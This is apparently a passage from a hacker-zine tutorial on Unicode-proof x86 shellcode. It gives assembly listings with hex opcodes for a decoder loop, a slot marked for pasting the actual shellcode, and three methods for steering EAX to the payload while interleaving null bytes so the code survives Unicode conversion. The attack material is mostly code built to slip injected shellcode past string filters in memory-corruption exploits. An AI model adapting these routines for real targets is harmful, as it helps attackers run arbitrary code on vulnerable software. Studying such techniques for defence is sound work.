%mov byte [eax],0x14   ; C60014
%add [ebp+0x0],al      ; 004500

%inc eax               ; 40
%add [ebp+0x0],al      ; 004500
%inc eax               ; 40
%add [ebp+0x0],al      ; 004500
%mov byte [eax],0xE2   ; C600E2
%add [ebp+0x0],al      ; 004500
%inc eax               ; 40
%add [ebp+0x0],al      ; 004500

%;
%; Loop_code
%;

%db 0x43
%db 0x00 ;0x8A         (*)
%db 0x14
%db 0x00 ;0x58
%db 0x88
%db 0x00 ;0x14
%db 0x18
%db 0x00 ;0xE2
%db 0xF7

%; < Paste 'unicode' shellcode there >

%-EOF-----------------------------------------------------------------------

%Then the 3 methodes to get EAX to point to the chosen code.
%(N.B : The 'main' code is 42*2 = 84 bytes long)

%- methode1.asm ------------------------------------------------------------
%; *********************************************
%; *        Adjusts EAX (+ 0xXXYY bytes)       *
%; *********************************************

%; N.B : 0xXX != 0x00

%add eax,0x0100XX00    ; 0500XX0001
%add [ebp+0x0],al      ; 004500
%add eax,0xFF000100    ; 05000100FF
%add [ebp+0x0],al      ; 004500

%; we added 0x(XX+1)00 to EAX

%; using : add al,0x0 as a NOP instruction :
%add al,0x0            ; 0400
%add al,0x0            ; 0400
%add al,0x0            ; 0400
%; [...]   <--  (0x100 - 0xYY) /2  times
%add al,0x0            ; 0400
%add al,0x0            ; 0400
%add al,0x0            ; 0400

%; (N.B) if 0xYY is odd then add a :
%dec eax               ; 48
%add [ebp+0x0],al      ; 004500
%-EOF-----------------------------------------------------------------------



%- methode2.asm ------------------------------------------------------------
%; *********************************************
%; *         Basically : POPs and XCHG         *
%; *********************************************

%popad                 ; 61
%add [ebp+0x0],al      ; 004500
%xchg eax, ?           ; 1 non null byte    (find out what to do here)
%add [ebp+0x0],al      ; 004500

%; do it again if needed, then use methode1 to make everything okay
%-EOF-----------------------------------------------------------------------



%- methode3.asm ------------------------------------------------------------
%; *********************************************
%; *                Using a CALL               *
%; *********************************************

%; Get the wanted address

%mov eax,0xAA00??00         ; B800??00AA
%add [ebp+0x0],al           ; 004500
%push eax                   ; 50
%add [ebp+0x0],al           ; 004500
%dec esp                    ; 4C
%add [ebp+0x0],al           ; 004500
%pop eax                    ; 58
%add [ebp+0x0],al           ; 004500
%mov al,0x0                 ; B000
%mov ecx,0xAA00!!00         ; B900!!00AA
%add ah,ch                  ; 00EC
%add [ebp+0x0],al           ; 004500

%; EAX = 0x00??!!00

%; awfull patch, i agree
%mov dword [eax],0x00C30058 ; C7005800C300
%inc eax                    ; 40
%add [ebp+0x0],al           ; 004500
%mov byte [eax],0x50        ; C60050
%add [ebp+0x0],al           ; 004500

%; just pray and call

%call 0x????????            ; E800!!00??

%add [ebp+0x0],al           ; 004500

%; then add 90d = 0x5A to EAX (to reach (*), where the loop_code is)
%; case where 0xXX = 0x00 so we can't use methode1

%add al,0x0                 ; 0400     because we're patching at [eax]

%mov [eax],eax              ; 8900
%add dword [eax],byte 0x5A  ; 83005A
%add [ebp+0x0],al           ; 004500
%mov eax,[eax]              ; 8B00

%; EAX pointes to the very first null byte of loop_code


%|=[ EOF ]=---------------------------------------------------------------=|
